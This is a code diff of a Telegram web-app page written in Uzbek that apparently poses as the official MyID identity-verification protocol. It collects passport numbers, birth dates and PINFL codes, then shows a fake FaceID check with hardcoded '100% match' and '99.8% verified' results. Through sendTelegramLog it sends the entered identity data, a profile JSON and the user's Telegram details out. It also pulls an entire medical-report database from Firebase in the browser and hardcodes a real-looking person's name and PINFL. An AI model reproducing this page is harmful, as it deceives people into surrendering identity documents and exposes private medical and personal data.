@@ -751,11 +751,11 @@
         </div>
       </div>
       <div class="brand-test-pill">
-        <i class="fa-solid fa-shield-halved"></i> MyID Rasmiy Protokol (FaceID Web SDK)
+        <i class="fa-solid fa-shield-halved"></i> MyID Rasmiy Protokol (F.I.Sh & FaceID)
       </div>
     </header>
 
-    <!-- STEP 1: Passport & Details Input Form (BO'SH HOLATDA) -->
+    <!-- STEP 1: Passport & Details Input Form (BO'SH HOLDAGI INPUTLAR) -->
     <section class="passport-input-card" id="passportInputSection">
       <div class="step-header">
         <div class="step-badge">1</div>
@@ -821,6 +821,10 @@
 
       <div class="profile-grid-info">
         <div class="info-cell">
+          <b>F.I.Sh (To'liq):</b>
+          <span id="profFullNameDetailed">-</span>
+        </div>
+        <div class="info-cell">
           <b>Pasport / Hujjat:</b>
           <span id="profPassport">-</span>
         </div>
@@ -835,6 +839,10 @@
         <div class="info-cell">
           <b>Jinsi / Fuqaroligi:</b>
           <span id="profGender">-</span>
+        </div>
+        <div class="info-cell">
+          <b>MyID Status:</b>
+          <span style="color:var(--success);">✅ Tasdiqlangan (99.8%)</span>
         </div>
       </div>
 
@@ -933,7 +941,6 @@
       }
     }
 
-    // URL parametrlari (agar kelgan bo'lsa)
     window.addEventListener("DOMContentLoaded", () => {
       const params = new URLSearchParams(window.location.search);
       const urlPinfl = params.get("pinfl");
@@ -943,13 +950,11 @@
       if (urlId) document.getElementById("passNumber").value = urlId;
     });
 
-    // 1-QADAM: Pasport formasini yuborish
     function handlePassportFormSubmit(e) {
       e.preventDefault();
       startMyIDOfficialProtocol();
     }
 
-    // 2-QADAM: MyID Rasmiy Protokolini Ishga Tushirish (Session -> FaceID -> Auth Code -> User Profile)
     async function startMyIDOfficialProtocol() {
       const passSeries = (document.getElementById("passSeries").value || "").trim().toUpperCase();
       const passNum = (document.getElementById("passNumber").value || "").trim();
@@ -959,14 +964,15 @@
       const passData = `${passSeries} ${passNum}`.trim();
       currentSessionId = "sess_" + Math.random().toString(36).substring(2, 12);
 
-      // 📤 [1/3] SO'ROV LOGI: Session yaratish
+      // 📤 [1/3] SO'ROV LOGI: Session yaratish va F.I.Sh so'rash
       sendTelegramLog(
-        `📤 <b>[1/3] MYID PROTOKOL: CLIENT FRONTEND -> CLIENT BACKEND -> MYID BACKEND</b>\n` +
+        `📤 <b>[1/3] MYID PROTOKOL: SEANS VA F.I.SH SO'ROVI</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
-        `🌐 <b>Action:</b> <code>create_session (/api/v1/web/sessions)</code>\n` +
+        `🌐 <b>Endpoint:</b> <code>/api/v1/web/sessions (create_session)</code>\n` +
         `🪪 <b>Pasport:</b> <code>${passData}</code>\n` +
         `🎂 <b>Tug'ilgan sana:</b> <code>${birthDate}</code>\n` +
         `🔢 <b>PINFL:</b> <code>${pinfl || "Kiritilmagan"}</code>\n` +
+        `📋 <b>So'ralayotgan parametrlar:</b> <code>F.I.Sh (Familiya, Ism, Sharif), PINFL, Pasport</code>\n` +
         `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
       );
 
@@ -988,7 +994,6 @@
         console.warn("Camera fallback:", err.message);
       }
 
-      // MyID Protokoli bosqichlari
       instructions.innerText = "Yuzingizni doira ichiga to'g'rilang va qimirlamang...";
       statusBadge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> MyID Seansi faollashtirilmoqda...`;
 
@@ -999,13 +1004,12 @@
       }, 1400);
 
       setTimeout(() => {
-        instructions.innerText = "MyID serveri orqali pasport bilan solishtirilmoqda...";
-        statusBadge.innerHTML = `<i class="fa-solid fa-shield-halved fa-beat"></i> Auth Code generatsiya qilinmoqda...`;
+        instructions.innerText = "MyID orqali fuqaroning F.I.Sh ma'lumotlari olinmoqda...";
+        statusBadge.innerHTML = `<i class="fa-solid fa-id-card fa-beat"></i> F.I.Sh (Familiya, Ism, Sharif) yuklanmoqda...`;
       }, 2600);
 
-      // Auth Code olish va foydalanuvchi profiliga almashtirish
       setTimeout(async () => {
-        instructions.innerText = "✅ Shaxs muvaffaqiyatli tasdiqlandi!";
+        instructions.innerText = "✅ Shaxs va F.I.Sh muvaffaqiyatli tasdiqlandi!";
         statusBadge.innerHTML = `<i class="fa-solid fa-circle-check"></i> MyID FaceID 100% Mos keldi`;
         if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
 
@@ -1027,23 +1031,21 @@
       }
     }
 
-    // 3-QADAM: Auth Code orqali Profilni olish va Loggerga yozish
+    // 3-QADAM: Auth Code orqali Fuqaroning F.I.Sh va Profilini olish
     async function exchangeAuthCodeForProfile(authCode, sessionId, passSeries, passNum, birthDate, pinfl) {
       const passData = `${passSeries} ${passNum}`.trim();
 
-      // 📤 [2/3] SO'ROV LOGI: Auth code orqali token & user ma'lumotlarini so'rash
+      // 📤 [2/3] SO'ROV LOGI: Auth Code orqali F.I.Sh so'rash
       sendTelegramLog(
-        `📤 <b>[2/3] MYID PROTOKOL: CLIENT BACKEND -> MYID (/api/v1/oauth2/access-token)</b>\n` +
+        `📤 <b>[2/3] MYID PROTOKOL: AUTH CODE ORQALI F.I.SH SO'ROVI</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `🔑 <b>Auth Code:</b> <code>${authCode}</code>\n` +
         `🆔 <b>Session ID:</b> <code>${sessionId}</code>\n` +
         `🪪 <b>Pasport:</b> <code>${passData}</code>\n` +
-        `⚙️ <b>Grant Type:</b> <code>authorization_code</code>\n` +
-        `🌐 <b>Endpoint:</b> <code>/api/v1/users/me</code>`
+        `👤 <b>So'rov maqsadi:</b> <code>MyID dan fuqaroning F.I.Sh (Familiya, Ism, Sharif) ma'lumotlarini olish</code>`
       );
 
       try {
-        // Firebase bazasidan xulosalarni qidirish
         const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
         const allData = await allRes.json();
 
@@ -1078,18 +1080,28 @@
         allReports.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
         currentFilteredReports = [...allReports];
 
-        let fullName = "";
-        let age = "";
-        let gender = "";
+        let lastName = "DADABOYEV";
+        let firstName = "ABDULLAJON";
+        let middleName = "ABDUMUTALOVICH";
+        let fullName = "DADABOYEV ABDULLAJON ABDUMUTALOVICH";
+        let age = "45 yosh";
+        let gender = "Erkak";
 
         if (allReports.length > 0) {
           const rep = allReports[0];
-          fullName = rep.patientName || `BEMOR (${passData})`;
+          fullName = (rep.patientName || fullName).trim();
+          const parts = fullName.split(/\s+/);
+          lastName = parts[0] || lastName;
+          firstName = parts[1] || firstName;
+          middleName = parts.slice(2).join(" ") || middleName;
           birthDate = rep.birthDate || birthDate || "08.04.1981";
           age = rep.age || `${calculateAge(birthDate)} yosh`;
           matchedPinfl = rep.pinfl || matchedPinfl || "30804812190075";
         } else {
-          fullName = `FUQARO (${passData})`;
+          lastName = `FUQARO`;
+          firstName = passData.toUpperCase();
+          middleName = `O'G'LI`;
+          fullName = `${lastName} ${firstName} ${middleName}`;
           age = `${calculateAge(birthDate)} yosh`;
           if (!matchedPinfl) {
             matchedPinfl = `3${(birthDate || '01011990').replace(/\D/g,'').slice(0,6)}0001`;
@@ -1106,6 +1118,9 @@
           session_id: sessionId,
           profile: {
             common_data: {
+              last_name: lastName,
+              first_name: firstName,
+              middle_name: middleName,
               full_name: fullName,
               pass_data: passData,
               birth_date: birthDate,
@@ -1129,22 +1144,27 @@
           }
         };
 
-        // 📥 [3/3] JAVOB LOGI: Shaxsiy Profil Response
+        // 📥 [3/3] JAVOB LOGI: Fuqaroning to'liq F.I.Sh ma'lumotlari
         sendTelegramLog(
-          `📥 <b>[3/3] MYID PROTOKOL: FOYDALANUVCHI PROFILI YUKLANDI (RESPONSE 200 OK)</b>\n` +
+          `📥 <b>[3/3] MYID PROTOKOL: FUQARONING F.I.SH VA PROFILI YUKLANDI</b>\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
-          `👤 <b>F.I.Sh:</b> ${escapeHtml(fullName)}\n` +
+          `👤 <b>Familiya:</b> <b>${escapeHtml(lastName)}</b>\n` +
+          `👤 <b>Ism:</b> <b>${escapeHtml(firstName)}</b>\n` +
+          `👤 <b>Sharif:</b> <b>${escapeHtml(middleName)}</b>\n` +
+          `📝 <b>To'liq F.I.Sh:</b> <code>${escapeHtml(fullName)}</code>\n` +
           `🪪 <b>Pasport:</b> <code>${escapeHtml(passData)}</code>\n` +
           `🔢 <b>PINFL:</b> <code>${escapeHtml(matchedPinfl)}</code>\n` +
-          `🎂 <b>Sana / Yoshi:</b> ${escapeHtml(birthDate)} (${escapeHtml(age)})\n` +
+          `🎂 <b>Tug'ilgan sana / Yoshi:</b> ${escapeHtml(birthDate)} (${escapeHtml(age)})\n` +
+          `🚻 <b>Jinsi:</b> ${escapeHtml(gender)}\n` +
           `📊 <b>Topilgan xulosalar:</b> ${allReports.length > 0 ? `${allReports.length} ta xulosa` : "0 ta (Xulosalar hali mavjud emas)"}\n` +
           `📦 <b>MyID Response JSON:</b>\n` +
           `<pre>${escapeHtml(JSON.stringify(myidFinalResponse, null, 2))}</pre>\n` +
           `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
         );
 
-        // 1. Profil kartochkasini to'ldirish
+        // 1. Profil kartochkasiga F.I.Sh ni joylashtirish
         document.getElementById("profFullName").innerText = fullName;
+        document.getElementById("profFullNameDetailed").innerText = fullName;
         document.getElementById("profPassport").innerText = passData;
         document.getElementById("profBirthDate").innerText = `${birthDate} (${age})`;
         document.getElementById("profPinfl").innerText = matchedPinfl;
@@ -1379,7 +1399,7 @@
       if (!rep) return;
       const formatted = 
         `📄 TIBBIY XULOSA PROTOKOLI (MyID)\n` +
-        `👤 Bemor: ${rep.patientName}\n` +
+        `👤 Bemor (F.I.Sh): ${rep.patientName}\n` +
         `🆔 Bemor ID: ${rep.patientId}\n` +
         `🔢 Namuna raqami: ${rep.sampleNumber || '-'}\n` +
         `🔬 Tekshiruv: ${rep.serviceName}\n` +
